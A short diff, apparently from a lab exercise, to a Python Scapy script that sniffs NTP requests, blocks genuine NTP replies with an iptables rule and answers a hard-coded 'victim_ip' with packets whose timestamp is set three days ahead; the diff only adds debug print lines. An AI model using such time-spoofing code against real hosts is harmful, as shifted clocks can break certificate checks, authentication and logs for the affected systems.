@@ -9,6 +9,7 @@ victim_ip = "10.10.10.10"
 ref_timestamp = time.time() + 259200
 #all these values are hard coded for the sake of this exercise
 def send_ntp(server, packet):
+    print('here')
     ntp_packet = packet
     print("incoming packet")
     #ntp_packet.show()
@@ -33,6 +34,7 @@ def send_ntp(server, packet):
 
 
 def ntp_request(packet):
+    print('here')
     ntp_layer = packet.getlayer(NTP)
     if ntp_layer and ntp_layer.mode == 3:
         send_ntp(victim_ip, packet)
@@ -40,4 +42,5 @@ def ntp_request(packet):
 if __name__ == "__main__":
     iptables_rule = "iptables -A INPUT -p udp --dport 123 -j DROP"
     os.system(iptables_rule)
+    print('here')
     sniff(filter="udp and port 123", prn=ntp_request)
